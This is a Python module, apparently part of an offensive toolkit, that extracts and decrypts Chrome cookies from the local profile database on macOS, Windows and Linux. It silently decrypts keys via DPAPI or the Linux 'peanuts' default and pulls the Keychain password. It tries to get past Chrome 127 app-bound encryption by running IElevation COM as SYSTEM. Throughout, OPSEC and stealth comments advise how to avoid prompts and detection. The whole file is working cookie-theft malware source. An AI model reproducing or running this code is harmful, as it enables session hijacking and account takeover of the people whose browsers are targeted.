"""Chromium cookie/credential decryption — cross-platform.

Handles Chrome's per-platform encryption:
  - macOS:   PBKDF2(Keychain password, salt='saltysalt', iter=1003) → AES-128-CBC
  - Windows: DPAPI CryptUnprotectData on os_crypt.encrypted_key → AES-256-GCM
  - Windows: Chrome 127+ (v20) uses app-bound encryption via IElevation COM
  - Linux:   PBKDF2('peanuts' or secret-service, salt='saltysalt', iter=1) → AES-128-CBC

OPSEC NOTES:
  - macOS:   Reading Chrome Safe Storage from Keychain TRIGGERS a visible prompt!
  - Windows: DPAPI decryption is SILENT (runs as current user, no prompt)
  - Windows: App-bound (v20) requires SYSTEM privileges — see _try_app_bound_key_windows()
  - Linux:   Hardcoded 'peanuts' key is SILENT. secret-service may prompt.

Chrome 127+ app-bound encryption (Windows only):
  Starting with Chrome 127, cookies are encrypted with v20 prefix using a key
  that is itself encrypted via the IElevation COM interface
  (CLSID {708860E0-F641-4611-8895-7D867DD3675B}). This COM object is only
  accessible from SYSTEM context (e.g., via PsExec -s or a SYSTEM service).
  Standard user-level DPAPI decryption will succeed on the outer layer but
  produce garbage for v20 cookies. For non-SYSTEM contexts, use the CDP-based
  cdp_cookies collector which bypasses all encryption entirely.

Requires: `cryptography` package (pip install cryptography)
"""

from __future__ import annotations

import base64
import json
import logging
import os
import re
import shutil
import sqlite3
import subprocess
import sys
import tempfile
from pathlib import Path
from typing import Dict, List, Optional, Tuple

from ..platform_utils import chrome_user_data_dir, get_platform

logger = logging.getLogger(__name__)


class DecryptError(Exception):
    pass


# Chrome version at which app-bound encryption was introduced (Windows only).
_APP_BOUND_MIN_VERSION = 127

# Cached Local State data to avoid repeated file reads within a session.
_local_state_cache: Optional[Dict] = None


def _read_local_state() -> Optional[Dict]:
    """Read and cache Chrome's Local State JSON.

    Returns the parsed dict, or None if the file doesn't exist or can't be parsed.
    Caches the result for the lifetime of the process to avoid repeated I/O.
    """
    global _local_state_cache
    if _local_state_cache is not None:
        return _local_state_cache

    chrome_dir = chrome_user_data_dir()
    local_state = chrome_dir / "Local State"
    if not local_state.exists():
        return None

    try:
        _local_state_cache = json.loads(local_state.read_text())
        return _local_state_cache
    except (json.JSONDecodeError, OSError):
        return None


def detect_chrome_version() -> Optional[Tuple[int, ...]]:
    """Read Chrome's version from the Local State file.

    Parses the version string stored at the path:
      Local State -> ... (various keys store version info)
    Also tries reading the "last_browser_version" field or the
    "stats_version" field.  Falls back to parsing the chrome.exe
    version on Windows, or the Info.plist on macOS.

    Returns a tuple of ints, e.g. (127, 0, 6723, 58), or None.
    """
    data = _read_local_state()
    if data is not None:
        # Try multiple known keys where Chrome stores its version
        for key_path in (
            ("last_browser_version",),
            ("stats_version",),
            ("profile", "last_active_profiles_version"),
        ):
            obj = data
            for k in key_path:
                obj = obj.get(k, {}) if isinstance(obj, dict) else None
                if obj is None:
                    break
            if isinstance(obj, str) and re.match(r"\d+\.\d+", obj):
                parts = tuple(int(x) for x in obj.split(".") if x.isdigit())
                if parts:
                    return parts

    # Fallback: try reading the chrome binary version directly
    plat = get_platform()
    if plat == "windows":
        try:
            for env_var in ("PROGRAMFILES", "PROGRAMFILES(X86)", "LOCALAPPDATA"):
                base = os.environ.get(env_var, "")
                if not base:
                    continue
                exe = Path(base) / "Google" / "Chrome" / "Application" / "chrome.exe"
                if exe.exists():
                    # Read version from the directory name next to chrome.exe
                    for child in exe.parent.iterdir():
                        if child.is_dir() and re.match(r"\d+\.\d+", child.name):
                            parts = tuple(
                                int(x) for x in child.name.split(".") if x.isdigit()
                            )
                            if parts:
                                return parts
        except OSError:
            pass

    return None


def is_app_bound_encryption(version: Optional[Tuple[int, ...]] = None) -> bool:
    """Return True if the detected Chrome version uses app-bound encryption.

    App-bound encryption was introduced in Chrome 127 on Windows.
    Always returns False on non-Windows platforms.
    """
    if get_platform() != "windows":
        return False
    if version is None:
        version = detect_chrome_version()
    if version is None:
        return False
    return version[0] >= _APP_BOUND_MIN_VERSION


def _warn_stderr(msg: str) -> None:
    """Log a warning, falling back to stderr if logging isn't configured."""
    if logger.handlers or logger.parent and logger.parent.handlers:
        logger.warning(msg)
    else:
        print(f"[WARN] [chromium_decrypt] {msg}", file=sys.stderr)


# Track whether the v20 per-cookie warning has already been emitted.
_v20_warning_emitted = False


def _try_app_bound_key_windows() -> Optional[bytes]:
    """Attempt to decrypt the app-bound encryption key via IElevation COM.

    Chrome 127+ (Windows) wraps the cookie encryption key with an additional
    layer of app-bound encryption.  The decryption is done through Chrome's
    IElevation COM object (CLSID {708860E0-F641-4611-8895-7D867DD3675B}).

    REQUIREMENTS:
      - Windows only
      - Must be running as NT AUTHORITY\\SYSTEM (e.g., PsExec -s, SYSTEM service)
      - Chrome's IElevation COM server must be registered (normal Chrome install)

    Returns the decrypted AES-256 key, or None if the attempt fails.

    OPSEC:
      - COM activation is logged by Windows ETW (stealth_score=3)
      - Running as SYSTEM is itself a privilege escalation indicator
      - Prefer the CDP-based cdp_cookies collector for stealth extraction
    """
    if get_platform() != "windows":
        return None

    try:
        import ctypes
        import ctypes.wintypes
    except ImportError:
        return None

    # Read the app-bound encrypted key from Local State (cached)
    data = _read_local_state()
    if data is None:
        return None

    # Chrome stores the app-bound key under os_crypt.app_bound_encrypted_key
    app_bound_key_b64 = data.get("os_crypt", {}).get("app_bound_encrypted_key")
    if not app_bound_key_b64:
        logger.debug("No app_bound_encrypted_key in Local State")
        return None

    try:
        app_bound_key_enc = base64.b64decode(app_bound_key_b64)
    except Exception:
        _warn_stderr("Failed to base64-decode app_bound_encrypted_key")
        return None

    # Strip the "APPB" prefix (4 bytes) if present
    if app_bound_key_enc[:4] == b"APPB":
        app_bound_key_enc = app_bound_key_enc[4:]

    # Check if running as SYSTEM — IElevation COM requires it
    try:
        # GetUserNameW returns the current user
        buf_size = ctypes.wintypes.DWORD(256)
        buf = ctypes.create_unicode_buffer(256)
        ctypes.windll.advapi32.GetUserNameW(buf, ctypes.byref(buf_size))
        current_user = buf.value.upper()

        if current_user != "SYSTEM":
            _warn_stderr(
                f"App-bound key decryption requires SYSTEM privileges "
                f"(current user: {current_user}). "
                f"Use PsExec -s or run from a SYSTEM service. "
                f"Alternatively, use the cdp_cookies collector to bypass encryption."
            )
            return None
    except Exception:
        _warn_stderr(
            "Could not determine current user; "
            "app-bound decryption requires SYSTEM privileges."
        )
        return None

    # Attempt IElevation COM call.
    # CLSID: {708860E0-F641-4611-8895-7D867DD3675B}
    # Interface: IElevation — DecryptData method
    try:
        import comtypes
        import comtypes.client

        CLSID_Elevation = "{708860E0-F641-4611-8895-7D867DD3675B}"
        elevation = comtypes.client.CreateObject(CLSID_Elevation)

        # Call the DecryptData method with the encrypted key bytes
        decrypted = elevation.DecryptData(app_bound_key_enc)
        if decrypted and len(decrypted) >= 32:
            # The result may have extra padding; take last 32 bytes for AES-256
            return bytes(decrypted[-32:])

        _warn_stderr("IElevation.DecryptData returned insufficient data")
        return None

    except ImportError:
        _warn_stderr(
            "comtypes package not available. App-bound key decryption requires "
            "comtypes (pip install comtypes) or use cdp_cookies collector instead."
        )
        return None
    except Exception as e:
        _warn_stderr(f"IElevation COM decryption failed: {e}")
        return None


def get_chrome_key(allow_prompt: bool = False) -> bytes:
    """Retrieve the Chrome encryption key for the current platform.

    Returns the raw AES key ready for decryption.

    OPSEC:
      macOS  → Keychain prompt (user-visible!) — SKIPPED by default
      Windows → DPAPI (silent, no prompt)
      Linux  → hardcoded or secret-service (usually silent)

    Set allow_prompt=True to enable macOS Keychain extraction (triggers
    a visible authorization dialog — NOT recommended for stealth ops).
    """
    plat = get_platform()

    if plat == "macos":
        if not allow_prompt:
            raise DecryptError(
                "macOS Chrome cookie decrypt requires Keychain prompt "
                "(Chrome Safe Storage). Skipped for OPSEC safety. "
                "Use --allow-prompt to override, or use device_code flow instead."
            )
        return _get_key_macos()
    elif plat == "windows":
        return _get_key_windows()
    else:
        return _get_key_linux()


def decrypt_cookie_value(
    encrypted: bytes,
    key: bytes,
    v10_key: Optional[bytes] = None,
) -> str:
    """Decrypt a Chrome encrypted cookie value.

    Chrome uses two encryption formats:
      - v10 (macOS/Linux): AES-128-CBC with PKCS7 padding
      - v10/v20 (Windows): AES-256-GCM with 12-byte nonce

    For Chrome 127+ on Windows, v20 cookies require an app-bound decrypted key.
    If the provided key fails on a v20 cookie, this function logs a warning and
    returns "".  If v10_key is provided, v10 cookies can still be decrypted even
    when the primary key is for v20.

    Args:
        encrypted: Raw encrypted cookie bytes from the database.
        key: Primary AES key (from get_chrome_key or app-bound decryption).
        v10_key: Optional separate key for v10 cookies (standard DPAPI key).
                 Useful when the primary key is the app-bound v20 key.
    """
    if not encrypted:
        return ""

    plat = get_platform()

    # Check version prefix
    if encrypted[:3] == b"v10" or encrypted[:3] == b"v11":
        if plat == "windows":
            # Try primary key first, then v10_key fallback
            result = _decrypt_aes_gcm(encrypted[3:], key)
            if not result and v10_key is not None and v10_key != key:
                result = _decrypt_aes_gcm(encrypted[3:], v10_key)
            return result
        else:
            return _decrypt_aes_cbc(encrypted[3:], key)

    elif encrypted[:3] == b"v20":
        # v20 = app-bound encryption (Chrome 127+, Windows)
        global _v20_warning_emitted
        result = _decrypt_aes_gcm(encrypted[3:], key)
        if not result and not _v20_warning_emitted:
            _v20_warning_emitted = True
            _warn_stderr(
                "v20 cookie decryption failed — this cookie uses Chrome 127+ "
                "app-bound encryption. The standard DPAPI key cannot decrypt v20 "
                "cookies. Options:\n"
                "  1. Run as SYSTEM for IElevation COM access\n"
                "  2. Use the cdp_cookies collector (bypasses all encryption)"
            )
        return result

    else:
        # Unencrypted or unknown format
        try:
            return encrypted.decode("utf-8")
        except UnicodeDecodeError:
            return ""


def extract_cookies(
    profile: str = "Default",
    host_patterns: Optional[List[str]] = None,
    key: Optional[bytes] = None,
) -> List[Dict[str, str]]:
    """Extract and decrypt cookies from Chrome's Cookies database.

    Args:
        profile: Chrome profile name (Default, Profile 1, etc.)
        host_patterns: List of host patterns to filter (e.g., ['.google.com', '.slack.com'])
        key: Pre-fetched encryption key. If None, will call get_chrome_key().

    Returns:
        List of dicts with: host, name, value, path, expires, secure, httponly
    """
    if key is None:
        key = get_chrome_key()

    chrome_dir = chrome_user_data_dir()
    cookies_db = chrome_dir / profile / "Cookies"

    # Newer Chrome versions moved Cookies to Network/Cookies
    if not cookies_db.exists():
        cookies_db = chrome_dir / profile / "Network" / "Cookies"

    if not cookies_db.exists():
        raise DecryptError(f"Cookies database not found at {cookies_db}")

    # Copy database to avoid lock conflicts with running Chrome
    tmp = tempfile.mktemp(suffix=".db")
    shutil.copy2(str(cookies_db), tmp)

    # Also copy WAL if present (contains recent uncommitted writes)
    for suffix in ["-wal", "-journal"]:
        wal = Path(str(cookies_db) + suffix)
        if wal.exists():
            shutil.copy2(str(wal), tmp + suffix)

    results = []
    try:
        conn = sqlite3.connect(tmp)
        conn.execute("PRAGMA journal_mode=wal")  # Handle WAL mode

        # Build query with optional host filter
        query = (
            "SELECT host_key, name, encrypted_value, value, path, "
            "expires_utc, is_secure, is_httponly "
            "FROM cookies"
        )
        params: list = []

        if host_patterns:
            clauses = []
            for pattern in host_patterns:
                clauses.append("host_key LIKE ?")
                params.append(f"%{pattern}%")
            query += " WHERE " + " OR ".join(clauses)

        query += " ORDER BY host_key, name"

        for row in conn.execute(query, params):
            host, name, enc_value, plain_value, path, expires, secure, httponly = row

            # Prefer encrypted value, fall back to plain
            if enc_value:
                try:
                    value = decrypt_cookie_value(enc_value, key)
                except Exception:
                    value = plain_value or ""
            else:
                value = plain_value or ""

            if not value:
                continue

            results.append({
                "host": host,
                "name": name,
                "value": value,
                "path": path,
                "expires": expires,
                "secure": bool(secure),
                "httponly": bool(httponly),
            })

        conn.close()
    finally:
        # Clean up temp copy
        for suffix in ["", "-wal", "-journal"]:
            try:
                os.unlink(tmp + suffix)
            except OSError:
                pass

    return results


# ── Platform-specific key retrieval ──────────────────────────────


def _get_key_macos() -> bytes:
    """macOS: Read Chrome Safe Storage password from Keychain, derive AES key.

    WARNING: This triggers a visible Keychain authorization prompt!
    """
    try:
        from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
        from cryptography.hazmat.primitives import hashes
    except ImportError:
        raise DecryptError(
            "cryptography package required: pip install cryptography"
        )

    # Read password from Keychain (TRIGGERS PROMPT!)
    result = subprocess.run(
        ["security", "find-generic-password", "-s", "Chrome Safe Storage", "-w"],
        capture_output=True, text=True, timeout=30,
    )

    if result.returncode != 0 or not result.stdout.strip():
        raise DecryptError(
            "Failed to read Chrome Safe Storage from Keychain. "
            "User may have denied the prompt. "
            "OPSEC: This triggers a visible authorization dialog."
        )

    password = result.stdout.strip().encode("utf-8")

    # Derive AES-128 key using PBKDF2
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA1(),
        length=16,
        salt=b"saltysalt",
        iterations=1003,
    )
    return kdf.derive(password)


def _get_key_windows() -> bytes:
    """Windows: Read encrypted key from Local State, decrypt with DPAPI.

    For Chrome 127+ (v20 app-bound encryption), tries the IElevation COM
    path first (requires SYSTEM). Falls back to standard DPAPI which still
    works for v10 cookies.

    SILENT — no user prompt. DPAPI uses the current user's credentials.
    """
    try:
        import ctypes
        import ctypes.wintypes
    except ImportError:
        raise DecryptError("Windows DPAPI requires ctypes (Windows only)")

    # Check Chrome version — if >= 127, try app-bound key first
    version = detect_chrome_version()
    if is_app_bound_encryption(version):
        ver_str = ".".join(str(x) for x in version) if version else "unknown"
        logger.info(
            "Chrome %s detected — v20 app-bound encryption may be active", ver_str
        )

        app_bound_key = _try_app_bound_key_windows()
        if app_bound_key is not None:
            logger.info("App-bound key decrypted via IElevation COM")
            return app_bound_key

        _warn_stderr(
            f"Chrome {ver_str} uses app-bound encryption for v20 cookies. "
            f"Standard DPAPI key will still work for v10 cookies, but v20 "
            f"cookies will fail to decrypt. For full extraction, either:\n"
            f"  1. Run as SYSTEM (PsExec -s) for IElevation COM access\n"
            f"  2. Use the cdp_cookies collector (bypasses all encryption)"
        )

    # Standard DPAPI path — works for all Chrome versions' v10 cookies
    data = _read_local_state()
    if data is None:
        raise DecryptError(
            f"Local State not found: {chrome_user_data_dir() / 'Local State'}"
        )

    encrypted_key_b64 = data.get("os_crypt", {}).get("encrypted_key")

    if not encrypted_key_b64:
        raise DecryptError("encrypted_key not found in Local State")

    encrypted_key = base64.b64decode(encrypted_key_b64)

    # Strip DPAPI prefix (5 bytes: "DPAPI")
    if encrypted_key[:5] == b"DPAPI":
        encrypted_key = encrypted_key[5:]

    # Decrypt using DPAPI
    class DATA_BLOB(ctypes.Structure):
        _fields_ = [
            ("cbData", ctypes.wintypes.DWORD),
            ("pbData", ctypes.POINTER(ctypes.c_char)),
        ]

    input_blob = DATA_BLOB(
        len(encrypted_key),
        ctypes.cast(
            ctypes.create_string_buffer(encrypted_key),
            ctypes.POINTER(ctypes.c_char),
        ),
    )
    output_blob = DATA_BLOB()

    if not ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(input_blob),
        None, None, None, None, 0,
        ctypes.byref(output_blob),
    ):
        raise DecryptError("DPAPI CryptUnprotectData failed")

    key = ctypes.string_at(output_blob.pbData, output_blob.cbData)
    ctypes.windll.kernel32.LocalFree(output_blob.pbData)
    return key


def _get_key_linux() -> bytes:
    """Linux: Use hardcoded 'peanuts' password or secret-service.

    SILENT — no user prompt (for the hardcoded key path).
    """
    try:
        from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
        from cryptography.hazmat.primitives import hashes
    except ImportError:
        raise DecryptError(
            "cryptography package required: pip install cryptography"
        )

    password = b"peanuts"  # Chrome's hardcoded default on Linux

    # Try secret-service (GNOME Keyring / KDE Wallet) first
    try:
        import secretstorage
        bus = secretstorage.dbus_init()
        collection = secretstorage.get_default_collection(bus)
        if collection.is_locked():
            collection.unlock()
        for item in collection.get_all_items():
            if item.get_label() == "Chrome Safe Storage":
                password = item.get_secret()
                break
    except Exception:
        pass  # Fall back to 'peanuts'

    # Derive AES-128 key using PBKDF2 (1 iteration on Linux!)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA1(),
        length=16,
        salt=b"saltysalt",
        iterations=1,
    )
    return kdf.derive(password)


# ── Decryption primitives ────────────────────────────────────────


def _decrypt_aes_cbc(data: bytes, key: bytes) -> str:
    """AES-128-CBC with PKCS7 padding (macOS/Linux v10 format).

    IV is 16 bytes of space (0x20).
    """
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding

    iv = b" " * 16  # Chrome uses spaces as IV
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    decryptor = cipher.decryptor()
    decrypted = decryptor.update(data) + decryptor.finalize()

    # Remove PKCS7 padding
    unpadder = padding.PKCS7(128).unpadder()
    unpadded = unpadder.update(decrypted) + unpadder.finalize()

    return unpadded.decode("utf-8", errors="replace")


def _decrypt_aes_gcm(data: bytes, key: bytes) -> str:
    """AES-256-GCM (Windows v10/v20 format).

    Format: [12-byte nonce][ciphertext + 16-byte GCM tag]
    The tag is appended to the ciphertext by cryptography library convention.
    """
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM

    nonce = data[:12]
    ciphertext_with_tag = data[12:]

    try:
        aesgcm = AESGCM(key)
        decrypted = aesgcm.decrypt(nonce, ciphertext_with_tag, None)
        return decrypted.decode("utf-8", errors="replace")
    except Exception:
        # Some Chrome versions use a slightly different layout or
        # the key doesn't match.  Try with empty AAD variants.
        try:
            # Try with empty bytes as AAD
            decrypted = aesgcm.decrypt(nonce, ciphertext_with_tag, b"")
            return decrypted.decode("utf-8", errors="replace")
        except Exception:
            pass

        # Last resort: try AES-CBC in case the version prefix was misleading
        try:
            return _decrypt_aes_cbc(data, key[:16])
        except Exception:
            return ""
